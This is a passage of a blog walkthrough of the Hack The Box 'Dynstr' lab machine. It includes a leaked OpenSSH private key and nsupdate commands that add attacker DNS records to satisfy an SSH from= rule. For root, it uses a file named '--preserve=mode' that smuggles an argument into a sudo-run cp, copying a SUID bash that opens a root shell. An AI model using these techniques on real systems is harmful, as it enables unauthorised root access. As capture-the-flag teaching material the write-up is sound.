+15123 read(5, "-----BEGIN OPENSSH PRIVATE KEY-----\nb3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAABFwAAAAdzc2gtcn\nNhAAAAAwEAAQAAAQEAxeKZHOy+RGhs+gnMEgsdQas7klAb37HhVANJgY7EoewTwmSCcsl1\n42kuvUhxLultlMRCj1pnZY/1sJqTywPGalR7VXo+2l0Dwx3zx7kQFiPeQJwiOM8u/g8lV3\nHjGnCvzI4UojALjCH3YPVuvuhF0yIPvJDessdot/D2VPJqS+TD/4NogynFeUrpIW5DSP+F\nL6oXil+sOM5ziRJQl/gKCWWDtUHHYwcsJpXotHxr5PibU8EgaKD6/heZXsD3Gn1VysNZdn\nUOLzjapbDdRHKRJDftvJ3ZXJYL5vtupoZuzTTD1VrOMng13Q5T90kndcpyhCQ50IW4XNbX\nCUjxJ+1jgwAAA8g3MHb+NzB2/gAAAAdzc2gtcnNhAAABAQDF4pkc7L5EaGz6CcwSCx1Bqz\nuSUBvfseFUA0mBjsSh7BPCZIJyyXXjaS69SHEu6W2UxEKPWmdlj/WwmpPLA8ZqVHtVej7a\nXQPDHfPHuRAWI95AnCI4zy7+DyVXceMacK/MjhSiMAuMIfdg9W6+6EXTIg+8kN6yx2i38P\nZU8mpL5MP/g2iDKcV5SukhbkNI/4UvqheKX6w4znOJElCX+AoJZYO1QcdjBywmlei0fGvk\n+JtTwSBooPr+F5lewPcafVXKw1l2dQ4vONqlsN1EcpEkN+28ndlclgvm+26mhm7NNMPVWs\n4yeDXdDlP3SSd1ynKEJDnQhbhc1tcJSPEn7WODAAAAAwEAAQAAAQEAmg1KPaZgiUjybcVq\nxTE52YHAoqsSyBbm4Eye0OmgUp5C07cDhvEngZ7E8D6RPoAi+wm+93Ldw8dK8e2k2QtbUD\nPswCKnA8AdyaxruDRuPY422/2w9qD0aHzKCUV0E4VeltSVY54bn0BiIW1whda1ZSTDM31k\nobFz6J8CZidCcUmLuOmnNwZI4A0Va0g9kO54leWkhnbZGYshBhLx1LMixw5Oc3adx3Aj2l\nu291/oBdcnXeaqhiOo5sQ/4wM1h8NQliFRXraymkOV7qkNPPPMPknIAVMQ3KHCJBM0XqtS\nTbCX2irUtaW+Ca6ky54TIyaWNIwZNznoMeLpINn7nUXbgQAAAIB+QqeQO7A3KHtYtTtr6A\nTyk6sAVDCvrVoIhwdAHMXV6cB/Rxu7mPXs8mbCIyiLYveMD3KT7ccMVWnnzMmcpo2vceuE\nBNS+0zkLxL7+vWkdWp/A4EWQgI0gyVh5xWIS0ETBAhwz6RUW5cVkIq6huPqrLhSAkz+dMv\nC79o7j32R2KQAAAIEA8QK44BP50YoWVVmfjvDrdxIRqbnnSNFilg30KAd1iPSaEG/XQZyX\nWv//+lBBeJ9YHlHLczZgfxR6mp4us5BXBUo3Q7bv/djJhcsnWnQA9y9I3V9jyHniK4KvDt\nU96sHx5/UyZSKSPIZ8sjXtuPZUyppMJVynbN/qFWEDNAxholEAAACBANIxP6oCTAg2yYiZ\nb6Vity5Y2kSwcNgNV/E5bVE1i48E7vzYkW7iZ8/5Xm3xyykIQVkJMef6mveI972qx3z8m5\nrlfhko8zl6OtNtayoxUbQJvKKaTmLvfpho2PyE4E34BN+OBAIOvfRxnt2x2SjtW3ojCJoG\njGPLYph+aOFCJ3+TAAAADWJpbmRtZ3JAbm9tZW4BAgMEBQ==\n-----END OPENSSH PRIVATE KEY-----\n", 4096) = 1823
+[...]
+</code></pre></div></div>
+
+<p>When I tried to SSH to bindmgr account using this key, noticed that it failed. Checking the contents of <code class="language-plaintext highlighter-rouge">authorized_keys</code> file, verified that we have a <code class="language-plaintext highlighter-rouge">from</code> option defined, that will prevent us from accessing the account using that key if not registered as a <code class="language-plaintext highlighter-rouge">*.infra.dyna.htb</code> subdomain.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>www-data@dynstr:/tmp<span class="nv">$ </span><span class="nb">cat</span> /home/bindmgr/.ssh/authorized_keys
+<span class="nv">from</span><span class="o">=</span><span class="s2">"*.infra.dyna.htb"</span> ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDF4pkc7L5EaGz6CcwSCx1BqzuSUBvfseFUA0mBjsSh7BPCZIJyyXXjaS69SHEu6W2UxEKPWmdlj/WwmpPLA8ZqVHtVej7aXQPDHfPHuRAWI95AnCI4zy7+DyVXceMacK/MjhSiMAuMIfdg9W6+6EXTIg+8kN6yx2i38PZU8mpL5MP/g2iDKcV5SukhbkNI/4UvqheKX6w4znOJElCX+AoJZYO1QcdjBywmlei0fGvk+JtTwSBooPr+F5lewPcafVXKw1l2dQ4vONqlsN1EcpEkN+28ndlclgvm+26mhm7NNMPVWs4yeDXdDlP3SSd1ynKEJDnQhbhc1tcJSPEn7WOD bindmgr@nomen
+</code></pre></div></div>
+
+<p>To achieve that, we would need to edit the hosts file, not possible with current credentials, but we could also leverage <code class="language-plaintext highlighter-rouge">nsupdate</code> to include our DNS entry into the <code class="language-plaintext highlighter-rouge">infra.dyna.htb</code> zone, where I’ve captured the command used in the API to be reused in our scenario:</p>
+
+<div class="language-php highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1">// Update DNS entry</span>
+<span class="nv">$cmd</span> <span class="o">=</span> <span class="nb">sprintf</span><span class="p">(</span><span class="s2">"server 127.0.0.1</span><span class="se">\n</span><span class="s2">zone %s</span><span class="se">\n</span><span class="s2">update delete %s.%s</span><span class="se">\n</span><span class="s2">update add %s.%s 30 IN A %s</span><span class="se">\n</span><span class="s2">send</span><span class="se">\n</span><span class="s2">"</span><span class="p">,</span><span class="nv">$d</span><span class="p">,</span><span class="nv">$h</span><span class="p">,</span><span class="nv">$d</span><span class="p">,</span><span class="nv">$h</span><span class="p">,</span><span class="nv">$d</span><span class="p">,</span><span class="nv">$myip</span><span class="p">);</span>
+<span class="nb">system</span><span class="p">(</span><span class="s1">'echo "'</span><span class="mf">.</span><span class="nv">$cmd</span><span class="mf">.</span><span class="s1">'" | /usr/bin/nsupdate -t 1 -k /etc/bind/ddns.key'</span><span class="p">,</span><span class="nv">$retval</span><span class="p">);</span>
+</code></pre></div></div>
+
+<p>Based on that, crafted the following command line to add our IP as a known subdomain</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>www-data@dynstr:/dev/shm<span class="nv">$ </span><span class="nb">cat </span>nsupdate
+server 127.0.0.1
+zone dyna.htb
+update delete attacker.infra.dyna.htb
+update add attacker.infra.dyna.htb 30 IN A 10.10.10.10
+send
+www-data@dynstr:/dev/shm<span class="nv">$ </span><span class="nb">cat </span>nsupdate | /usr/bin/nsupdate <span class="nt">-t</span> 1 <span class="nt">-k</span> /etc/bind/ddns.key
+update failed: REFUSED
+</code></pre></div></div>
+
+<p>After some research, found that this REFUSED error could be due to the key used and, checking the directory where the <code class="language-plaintext highlighter-rouge">ddns.key</code> was located, found 2 other files (as below), where the include using the file <code class="language-plaintext highlighter-rouge">infra.key</code> worked successfully <strong>BUT</strong> I still wasn’t able to connect using SSH.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>www-data@dynstr:/dev/shm<span class="nv">$ </span><span class="nb">ls</span> <span class="nt">-la</span> /etc/bind/<span class="k">*</span>.key
+<span class="nt">-rw-r--r--</span> 1 root <span class="nb">bind </span>100 Mar 15 20:44 /etc/bind/ddns.key
+<span class="nt">-rw-r--r--</span> 1 root <span class="nb">bind </span>101 Mar 15 20:44 /etc/bind/infra.key
+<span class="nt">-rw-r-----</span> 1 <span class="nb">bind bind </span>100 Mar 15 20:14 /etc/bind/rndc.key
+</code></pre></div></div>
+
+<p>Doing some troubleshooting, noticed that I was able to solve the <code class="language-plaintext highlighter-rouge">attacker.infra.dyna.htb</code> but the reverse lookup of the IP address wasn’t possible. To fix this, I have added another entry in the <code class="language-plaintext highlighter-rouge">nsupdate</code> command to also include a PTR record to the IP as below. A crucial point I also had to troubleshoot was that the A and PTR records <strong>must be separated by a blank line</strong>, otherwise the update would fail.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>www-data@dynstr:/dev/shm<span class="nv">$ </span><span class="nb">cat </span>nsupdate
+server 127.0.0.1
+update add attacker.infra.dyna.htb 30 A 10.10.10.10
+send
+
+update add 121.14.10.10.in-addr.arpa 30 PTR attacker.infra.dyna.htb
+send
+www-data@dynstr:/dev/shm<span class="nv">$ </span><span class="nb">cat </span>nsupdate | /usr/bin/nsupdate <span class="nt">-t</span> 1 <span class="nt">-k</span> /etc/bind/infra.key
+www-data@dynstr:/dev/shm<span class="err">$</span>
+</code></pre></div></div>
+
+<p>After that adjustment, I was able to SSH as <code class="language-plaintext highlighter-rouge">bindmgr</code> and read the content of <code class="language-plaintext highlighter-rouge">user.txt</code> file</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>bindmgr@dynstr:~<span class="nv">$ </span><span class="nb">ls</span> <span class="nt">-la</span>
+total 36
+drwxr-xr-x 5 bindmgr bindmgr 4096 Mar 15 20:39 <span class="nb">.</span>
+drwxr-xr-x 4 root    root    4096 Mar 15 20:26 ..
+lrwxrwxrwx 1 bindmgr bindmgr    9 Mar 15 20:29 .bash_history -&gt; /dev/null
+<span class="nt">-rw-r--r--</span> 1 bindmgr bindmgr  220 Feb 25  2020 .bash_logout
+<span class="nt">-rw-r--r--</span> 1 bindmgr bindmgr 3771 Feb 25  2020 .bashrc
+drwx------ 2 bindmgr bindmgr 4096 Mar 13 12:09 .cache
+<span class="nt">-rw-r--r--</span> 1 bindmgr bindmgr  807 Feb 25  2020 .profile
+drwxr-xr-x 2 bindmgr bindmgr 4096 Mar 13 12:09 .ssh
+drwxr-xr-x 2 bindmgr bindmgr 4096 Mar 13 14:53 support-case-C62796521
+<span class="nt">-r--------</span> 1 bindmgr bindmgr   33 Aug 16 15:49 user.txt
+bindmgr@dynstr:~<span class="nv">$ </span><span class="nb">cat </span>use
+<span class="nb">cat</span>: use: No such file or directory
+bindmgr@dynstr:~<span class="nv">$ </span><span class="nb">cat </span>user.txt
+&lt;redacted&gt;
+</code></pre></div></div>
+
+<h2 id="root-flag">Root flag</h2>
+
+<p>As always, started with a <code class="language-plaintext highlighter-rouge">sudo -l</code> command, where I found that the <code class="language-plaintext highlighter-rouge">bindmgr</code> user is capable to run the script below as root:</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>bindmgr@dynstr:~<span class="nv">$ </span><span class="nb">sudo</span> <span class="nt">-l</span>
+<span class="nb">sudo</span>: unable to resolve host dynstr.dyna.htb: Name or service not known
+Matching Defaults entries <span class="k">for </span>bindmgr on dynstr:
+    env_reset, mail_badpass, <span class="nv">secure_path</span><span class="o">=</span>/usr/local/sbin<span class="se">\:</span>/usr/local/bin<span class="se">\:</span>/usr/sbin<span class="se">\:</span>/usr/bin<span class="se">\:</span>/sbin<span class="se">\:</span>/bin<span class="se">\:</span>/snap/bin
+
+User bindmgr may run the following commands on dynstr:
+    <span class="o">(</span>ALL<span class="o">)</span> NOPASSWD: /usr/local/bin/bindmgr.sh
+bindmgr@dynstr:~
+</code></pre></div></div>
+
+<p>Checking its content, noticed one interesting entry in <strong>line 42</strong>, where the script, running as <code class="language-plaintext highlighter-rouge">root</code>, copies the file <code class="language-plaintext highlighter-rouge">.version</code> and all other existing files in the current directory (<code class="language-plaintext highlighter-rouge">*</code>) to $BINDMGR_DIR. Also, it requires a <code class="language-plaintext highlighter-rouge">.version</code> file in the current directory to be compared with the existing configuration in the server.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c"># Stage new version of configuration files.</span>
+<span class="nb">echo</span> <span class="s2">"[+] Staging files to </span><span class="nv">$BINDMGR_DIR</span><span class="s2">."</span>
+<span class="nb">cp</span> .version <span class="k">*</span> /etc/bind/named.bindmgr/
+</code></pre></div></div>
+
+<p>After the first execution, noticed that <code class="language-plaintext highlighter-rouge">.version</code> was copied with <code class="language-plaintext highlighter-rouge">root</code> permissions, allowing us to abuse a SUID binary this way.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>bindmgr@dynstr:/tmp/tmp.UzxayH3IIl<span class="nv">$ </span><span class="nb">sudo</span> /usr/local/bin/bindmgr.sh
+<span class="nb">sudo</span>: unable to resolve host dynstr.dyna.htb: Name or service not known
+<span class="o">[</span>+] Running /usr/local/bin/bindmgr.sh to stage new configuration from /tmp/tmp.UzxayH3IIl.
+<span class="o">[</span>+] Creating /etc/bind/named.conf.bindmgr file.
+<span class="o">[</span>+] Staging files to /etc/bind/named.bindmgr.
+<span class="nb">cp</span>: cannot <span class="nb">stat</span> <span class="s1">'*'</span>: No such file or directory
+<span class="o">[</span>+] Checking staged configuration.
+<span class="o">[</span>-] ERROR: The generated configuration is not valid. Please fix following errors:
+    /etc/bind/named.conf.bindmgr:2: open: /etc/bind/named.bindmgr/<span class="k">*</span>: file not found
+bindmgr@dynstr:/tmp/tmp.UzxayH3IIl<span class="nv">$ </span><span class="nb">ls</span> <span class="nt">-la</span> /etc/bind/named.bindmgr/
+total 12
+drwxr-sr-x 2 root <span class="nb">bind </span>4096 Aug 16 18:22 <span class="nb">.</span>
+drwxr-sr-x 3 root <span class="nb">bind </span>4096 Aug 16 18:22 ..
+<span class="nt">-rw-r--r--</span> 1 root <span class="nb">bind    </span>2 Aug 16 18:22 .version
+</code></pre></div></div>
+
+<p>Checking the <a href="https://gtfobins.github.io/gtfobins/cp/#suid">cp | GTFOBins</a> for SUID, noticed that if <code class="language-plaintext highlighter-rouge">cp</code> has SUID it could be used to copy contents from restricted file systems but, as it is not the case, we would need another way to abuse the use of <code class="language-plaintext highlighter-rouge">cp</code> in this script.</p>
+
+<p>One point seen in the page mentioned above is that we could use the parameter <code class="language-plaintext highlighter-rouge">--preserve</code> to <strong>preserve file attributes</strong> during the copy. Appending this parameter to execution could be achieved thanks to a <code class="language-plaintext highlighter-rouge">bash</code> feature called <strong>filename expansion</strong>, popularly known as <strong><em><a href="https://tldp.org/LDP/abs/html/globbingref.html">globbing</a></em></strong> which <strong>expands</strong> the names of the files during command execution.  This behavior can be seen in the example below with <code class="language-plaintext highlighter-rouge">echo</code>:</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>bindmgr@dynstr:/tmp/tmp.PdP9Qf49qx<span class="nv">$ </span><span class="nb">ls</span> <span class="nt">-l</span>
+total 0
+<span class="nt">-rw-rw-r--</span> 1 bindmgr bindmgr 0 Aug 16 19:15 file.sh
+<span class="nt">-rw-rw-r--</span> 1 bindmgr bindmgr 0 Aug 16 19:15 test.txt
+bindmgr@dynstr:/tmp/tmp.PdP9Qf49qx<span class="nv">$ </span><span class="nb">echo</span> <span class="k">*</span>
+file.sh test.txt
+</code></pre></div></div>
+
+<p>This could be exploited as we could also abuse that during <code class="language-plaintext highlighter-rouge">cp</code> execution, copying a previously SUID configured file, allowing us to escalate privileges.</p>
+
+<p>This was achieved by running the steps below:</p>
+
+<ul>
+  <li>Copied <code class="language-plaintext highlighter-rouge">/bin/bash</code> to a working temp directory and changed its permissions, setting its SUID bit and creating the <code class="language-plaintext highlighter-rouge">.version</code> file.</li>
+</ul>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>bindmgr@dynstr:/tmp<span class="nv">$ </span><span class="nb">cd</span> <span class="si">$(</span><span class="nb">mktemp</span> <span class="nt">-d</span><span class="si">)</span>
+bindmgr@dynstr:/tmp/tmp.7i6oryDsae<span class="nv">$ </span><span class="nb">cp</span> /bin/bash <span class="nb">.</span>
+bindmgr@dynstr:/tmp/tmp.7i6oryDsae<span class="nv">$ </span><span class="nb">chmod </span>u+s bash
+bindmgr@dynstr:/tmp/tmp.7i6oryDsae<span class="nv">$ </span><span class="nb">echo </span>1 <span class="o">&gt;</span> .version
+bindmgr@dynstr:/tmp/tmp.7i6oryDsae<span class="nv">$ </span><span class="nb">ls</span> <span class="nt">-la</span>
+total 1168
+drwx------  2 bindmgr bindmgr    4096 Aug 16 19:22 <span class="nb">.</span>
+drwxrwxrwt 13 root    root       4096 Aug 16 19:22 ..
+<span class="nt">-rwsr-xr-x</span>  1 bindmgr bindmgr 1183448 Aug 16 19:22 bash
+<span class="nt">-rw-rw-r--</span>  1 bindmgr bindmgr       2 Aug 16 19:22 .version
+</code></pre></div></div>
+
+<ul>
+  <li>Created a file called <code class="language-plaintext highlighter-rouge">--preserve=mode</code>, so its name could be expanded as a parameter for <code class="language-plaintext highlighter-rouge">cp</code> during script execution, copying <code class="language-plaintext highlighter-rouge">bash</code> as root but keeping SUID set. We can confirm that as well using <code class="language-plaintext highlighter-rouge">echo</code>, also below</li>
+</ul>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>bindmgr@dynstr:/tmp/tmp.7i6oryDsae<span class="nv">$ </span><span class="nb">echo</span> <span class="s2">""</span> <span class="o">&gt;</span> ./--preserve<span class="o">=</span>mode
+bindmgr@dynstr:/tmp/tmp.7i6oryDsae<span class="nv">$ </span><span class="nb">echo</span> <span class="k">*</span>
+bash <span class="nt">--preserve</span><span class="o">=</span>mode
+</code></pre></div></div>
+
+<ul>
+  <li>Ran the script using <code class="language-plaintext highlighter-rouge">sudo</code>
+</li>
+</ul>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>bindmgr@dynstr:/tmp/tmp.7i6oryDsae<span class="nv">$ </span><span class="nb">sudo</span> /usr/local/bin/bindmgr.sh
+<span class="nb">sudo</span>: unable to resolve host dynstr.dyna.htb: Name or service not known
+<span class="o">[</span>+] Running /usr/local/bin/bindmgr.sh to stage new configuration from /tmp/tmp.7i6oryDsae.
+<span class="o">[</span>+] Creating /etc/bind/named.conf.bindmgr file.
+<span class="o">[</span>+] Staging files to /etc/bind/named.bindmgr.
+<span class="o">[</span>+] Checking staged configuration.
+<span class="o">[</span>-] ERROR: The generated configuration is not valid. Please fix following errors:
+    /etc/bind/named.bindmgr/bash:1: unknown option <span class="s1">'ELF...'</span>
+    /etc/bind/named.bindmgr/bash:14: unknown option <span class="s1">'hȀE'</span>
+    /etc/bind/named.bindmgr/bash:40: unknown option <span class="s1">'YF'</span>
+    /etc/bind/named.bindmgr/bash:40: unexpected token near <span class="s1">'}'</span>
+</code></pre></div></div>
+
+<ul>
+  <li>Executed the <code class="language-plaintext highlighter-rouge">bash</code> binary with <code class="language-plaintext highlighter-rouge">-p</code> parameter, as stated in <a href="https://gtfobins.github.io/gtfobins/bash/#suid">bash | GTFOBins</a>, giving me an interactive shell as <code class="language-plaintext highlighter-rouge">root</code> and able to read contents of <code class="language-plaintext highlighter-rouge">/root/root.txt</code> file <img class="emoji" title=":smiley:" alt=":smiley:" src="https://github.githubassets.com/images/icons/emoji/unicode/1f603.png" height="20" width="20">
+</li>
+</ul>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>bindmgr@dynstr:/tmp/tmp.7i6oryDsae<span class="nv">$ </span>/etc/bind/named.bindmgr/bash <span class="nt">-p</span>
+bash-5.0# <span class="nb">ls</span> <span class="nt">-la</span>
+total 1172
+drwx------  2 bindmgr bindmgr    4096 Aug 16 19:10  <span class="nb">.</span>
+drwxrwxrwt 13 root    root       4096 Aug 16 19:09  ..
+<span class="nt">-rwsr-xr-x</span>  1 bindmgr bindmgr 1183448 Aug 16 19:10  bash
+<span class="nt">-rw-rw-r--</span>  1 bindmgr bindmgr       1 Aug 16 19:10 <span class="s1">'--preserve=mode'</span>
+<span class="nt">-rw-rw-r--</span>  1 bindmgr bindmgr       2 Aug 16 19:10  .version
+bash-5.0# <span class="nb">cd</span> /root
+bash-5.0# <span class="nb">cat </span>root.txt
+&lt;redacted&gt;
+</code></pre></div></div>
+
+<p>I hope you guys have enjoyed it!</p>
+
+<p>See you at the next post <img class="emoji" title=":smile:" alt=":smile:" src="https://github.githubassets.com/images/icons/emoji/unicode/1f604.png" height="20" width="20"></p>
+
+        
+      </section>
+
+      <footer class="page__meta">
+        
+        
+  
+
+
+  
+
+  <p class="page__taxonomy">
+    <strong><i class="fas fa-fw fa-tags" aria-hidden="true"></i> Tags: </strong>
+    <span itemprop="keywords">
+    
+      <a href="/en-US/tag/#hackthebox" class="page__taxonomy-item p-category" rel="tag">HackTheBox</a><span class="sep">, </span>
+    
+      <a href="/en-US/tag/#htb-linux" class="page__taxonomy-item p-category" rel="tag">HTB Linux</a><span class="sep">, </span>
+    
+      <a href="/en-US/tag/#htb-medium" class="page__taxonomy-item p-category" rel="tag">HTB Medium</a>
+    
+    </span>
+  </p>
+
+
+
+
+  
+
+
+  
+
+  <p class="page__taxonomy">
+    <strong><i class="fas fa-fw fa-folder-open" aria-hidden="true"></i> Categories: </strong>
+    <span itemprop="keywords">
+    
+      <a href="/en-US/categories/#walkthrough" class="page__taxonomy-item p-category" rel="tag">Walkthrough</a>
+    
+    </span>
+  </p>
+
+
+        
+
+  <p class="page__date"><strong><i class="fas fa-fw fa-calendar-alt" aria-hidden="true"></i> Updated:</strong> <time class="dt-published" datetime="2021-10-16T13:00:00-03:00">October 16, 2021</time></p>
+
+      </footer>
+
+      <section class="page__share" id="sharelinks">
+  
+    <h4 class="page__share-title">Share on</h4>
+  
+
+  <!-- CUSTOM: Localized sharing links -->
+  
+
+  <a href="https://twitter.com/intent/tweet?via=zerahzurc&amp;text=Walktrough%3A+HTB+Dynstr%20https%3A%2F%2Fdavicruz.com%2Fwalkthrough%2F2021%2F10%2Fhtb-dynstr" class="btn btn--twitter" onclick="window.open(this.href, 'window', 'left=20,top=20,width=500,height=500,toolbar=1,resizable=0'); return false;" title="Share on Twitter"><i class="fab fa-fw fa-twitter" aria-hidden="true"></i><span> Twitter</span></a>
+
+  <a href="https://www.facebook.com/sharer/sharer.php?u=https%3A%2F%2Fdavicruz.com%2Fwalkthrough%2F2021%2F10%2Fhtb-dynstr" class="btn btn--facebook" onclick="window.open(this.href, 'window', 'left=20,top=20,width=500,height=500,toolbar=1,resizable=0'); return false;" title="Share on Facebook"><i class="fab fa-fw fa-facebook" aria-hidden="true"></i><span> Facebook</span></a>
+
+  <a href="https://www.linkedin.com/shareArticle?mini=true&amp;url=https%3A%2F%2Fdavicruz.com%2Fwalkthrough%2F2021%2F10%2Fhtb-dynstr" class="btn btn--linkedin" onclick="window.open(this.href, 'window', 'left=20,top=20,width=500,height=500,toolbar=1,resizable=0'); return false;" title="Share on LinkedIn"><i class="fab fa-fw fa-linkedin" aria-hidden="true"></i><span> LinkedIn</span></a>
+
+  <a href="whatsapp://send?text=https%3A%2F%2Fdavicruz.com%2Fwalkthrough%2F2021%2F10%2Fhtb-dynstr" data-action="share/whatsapp/share" class="btn btn--whatsapp" onclick="window.open(this.href, 'window', 'left=20,top=20,width=500,height=500,toolbar=1,resizable=0'); return false;" title="Share on Whatsapp"><i class="fab fa-fw fa-whatsapp" aria-hidden="true"></i><span> Whatsapp</span></a>
+
+  <a href="https://telegram.me/share/url?url=https%3A%2F%2Fdavicruz.com%2Fwalkthrough%2F2021%2F10%2Fhtb-dynstr&amp;text=Walktrough%3A+HTB+Dynstr" class="btn btn--telegram" onclick="window.open(this.href, 'window', 'left=20,top=20,width=500,height=500,toolbar=1,resizable=0'); return false;" title="Share on Telegram"><i class="fab fa-fw fa-telegram-plane" aria-hidden="true"></i><span> Telegram</span></a>
+
+  <!-- END CUSTOM: Localized sharing links -->
+</section>
+
+
+      
+  <nav class="pagination">
+    
+    
+      <a href="/en-US/walkthrough/2021/10/htb-cap" class="pagination--pager" title="Walktrough: HTB Cap
+">Previous</a>
+    
+    
+    
+      
+        <a href="/en-US/walkthrough/2021/10/htb-explore" class="pagination--pager" title="Walktrough: HTB Explore
+">Next</a>
+      
+    
+  </nav>
+
+    </div>
+
+    
+      <div class="page__comments">
+  
+  
+      <h4 class="page__comments-title">Leave a comment</h4>
+      <section id="utterances-comments"></section>
+    
+</div>
+
+    
+  </article>
+
+  
+  
+    <div class="page__related">
+      <h2 class="page__related-title">You may also enjoy</h2>
+      <div class="grid__wrapper">
+        
+          
+
+
+
+<div class="grid__item">
+  <article class="archive__item" itemscope itemtype="https://schema.org/CreativeWork">
+    
+      <div class="archive__item-teaser">
+        <img src="https://i.imgur.com/TJKS5F6.png" alt="">
+      </div>
+    
+    <h2 class="archive__item-title no_toc" itemprop="headline">
+      <!-- CUSTOM: Use localized link to posts in archive page -->
+      
+
+      
+        <a href="/en-US/walkthrough/2021/10/htb-explore" rel="permalink">Walktrough: HTB Explore
+</a>
+      
+
+      
+      <!-- END CUSTOM: Use localized link to posts in archive page-->
+    </h2>
+    
+
+  <p class="page__meta">
+    
+      
+      <span class="page__meta-date">
+        <i class="far fa-fw fa-calendar-alt" aria-hidden="true"></i>
+        
+        <time datetime="2021-10-30T13:00:00-03:00">October 30, 2021</time>
+      </span>
+    
+
+    <span class="page__meta-sep"></span>
+
+    
+      
+      
+
+      <span class="page__meta-readtime">
+        <i class="far fa-fw fa-clock" aria-hidden="true"></i>
+        
+          4 minute read
+        
+      </span>
+    
+
+    <!-- CUSTOM: Post Meta attributes and links -->
+    <span class="page__meta-sep page__meta-lang"></span>
+    
+    
+    
+    <span class="page__meta-lang"><a href="/walkthrough/2021/10/htb-dynstr">Leia também em  <img class="emoji" title=":brazil:" alt=":brazil:" src="https://github.githubassets.com/images/icons/emoji/unicode/1f1e7-1f1f7.png" height="20" width="20"></a></span>
+    
+
+    
+
+    
+
+    
+    
+    
+    
+    
+  <span class="page__meta-sep page__meta-share"></span>
+  <span class="page__meta-share">
+    <i class="fas fa-share-alt" aria-hidden="true"></i>
+    <a href="#sharelinks">Share</a>
+  </span>
+    <!-- END CUSTOM: Post Meta attributes and links -->
+  </p>
+
+
+    <p class="archive__item-excerpt" itemprop="description">Hello guys!
+
+This week’s machine will be Explore, an easy-rated Android box from Hack The Box, created by bertolis.
+</p>
+  </article>
+</div>
+
+        
+          
+
+
+
+<div class="grid__item">
+  <article class="archive__item" itemscope itemtype="https://schema.org/CreativeWork">
+    
+      <div class="archive__item-teaser">
+        <img src="https://i.imgur.com/JkBtXmO.png" alt="">
+      </div>
+    
+    <h2 class="archive__item-title no_toc" itemprop="headline">
+      <!-- CUSTOM: Use localized link to posts in archive page -->
+      
+
+      
+        <a href="/en-US/walkthrough/2021/10/htb-cap" rel="permalink">Walktrough: HTB Cap
+</a>
+      
+
+      
+      <!-- END CUSTOM: Use localized link to posts in archive page-->
+    </h2>
+    
+
+  <p class="page__meta">
+    
+      
+      <span class="page__meta-date">
+        <i class="far fa-fw fa-calendar-alt" aria-hidden="true"></i>
+        
+        <time datetime="2021-10-02T13:00:00-03:00">October 2, 2021</time>
+      </span>
+    
+
+    <span class="page__meta-sep"></span>
+
+    
+      
+      
+
+      <span class="page__meta-readtime">
+        <i class="far fa-fw fa-clock" aria-hidden="true"></i>
+        
+          6 minute read
+        
+      </span>
+    
+
+    <!-- CUSTOM: Post Meta attributes and links -->
+    <span class="page__meta-sep page__meta-lang"></span>
+    
+    
+    
+    <span class="page__meta-lang"><a href="/walkthrough/2021/10/htb-dynstr">Leia também em  <img class="emoji" title=":brazil:" alt=":brazil:" src="https://github.githubassets.com/images/icons/emoji/unicode/1f1e7-1f1f7.png" height="20" width="20"></a></span>
+    
+
+    
+
+    
+
+    
+    
+    
+    
+    
+  <span class="page__meta-sep page__meta-share"></span>
+  <span class="page__meta-share">
+    <i class="fas fa-share-alt" aria-hidden="true"></i>
+    <a href="#sharelinks">Share</a>
+  </span>
+    <!-- END CUSTOM: Post Meta attributes and links -->
+  </p>
+
+
+    <p class="archive__item-excerpt" itemprop="description">Hello guys!
+
+This week’s machine will be Cap, another easy-rated Linux box from Hack The Box, created by InfoSecJack.
+</p>
+  </article>
+</div>
+
+        
+          
+
+
+
+<div class="grid__item">
+  <article class="archive__item" itemscope itemtype="https://schema.org/CreativeWork">
+    
+      <div class="archive__item-teaser">
+        <img src="https://i.imgur.com/pUqq7fY.png" alt="">
+      </div>
+    
+    <h2 class="archive__item-title no_toc" itemprop="headline">
+      <!-- CUSTOM: Use localized link to posts in archive page -->
+      
+
+      
+        <a href="/en-US/walkthrough/2021/09/htb-pit" rel="permalink">Walktrough: HTB Pit
+</a>
+      
+
+      
+      <!-- END CUSTOM: Use localized link to posts in archive page-->
+    </h2>
+    
+
+  <p class="page__meta">
+    
+      
+      <span class="page__meta-date">
+        <i class="far fa-fw fa-calendar-alt" aria-hidden="true"></i>
+        
+        <time datetime="2021-09-25T09:00:00-03:00">September 25, 2021</time>
+      </span>
+    
+
+    <span class="page__meta-sep"></span>
+
+    
+      
+      
+
+      <span class="page__meta-readtime">
+        <i class="far fa-fw fa-clock" aria-hidden="true"></i>
+        
+          12 minute read
+        
+      </span>
+    
+
+    <!-- CUSTOM: Post Meta attributes and links -->
+    <span class="page__meta-sep page__meta-lang"></span>
+    
+    
+    
+    <span class="page__meta-lang"><a href="/walkthrough/2021/10/htb-dynstr">Leia também em  <img class="emoji" title=":brazil:" alt=":brazil:" src="https://github.githubassets.com/images/icons/emoji/unicode/1f1e7-1f1f7.png" height="20" width="20"></a></span>
+    
+
+    
+
+    
+
+    
+    
+    
+    
+    
+  <span class="page__meta-sep page__meta-share"></span>
+  <span class="page__meta-share">
+    <i class="fas fa-share-alt" aria-hidden="true"></i>
+    <a href="#sharelinks">Share</a>
+  </span>
+    <!-- END CUSTOM: Post Meta attributes and links -->
+  </p>
+
+
+    <p class="archive__item-excerpt" itemprop="description">Hello guys!
+
+This week’s machine will be Pit, another medium-rated Linux box from Hack The Box, created by polarbearer and GibParadox.
